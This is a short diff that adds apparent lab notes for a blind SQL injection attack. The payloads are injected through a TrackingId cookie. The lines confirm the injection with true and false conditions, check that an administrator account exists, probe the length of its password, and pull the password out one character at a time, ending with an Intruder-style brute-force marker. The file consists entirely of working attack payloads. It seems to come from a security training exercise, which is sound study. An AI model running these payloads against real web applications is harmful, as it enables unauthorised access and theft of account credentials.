@@ -1,0 +1,10 @@
+TrackingId=xyz' AND '1'='1 >>Welcome back message
+TrackingId=xyz' AND '1'='2 >> No message
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+....
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§ >>payload
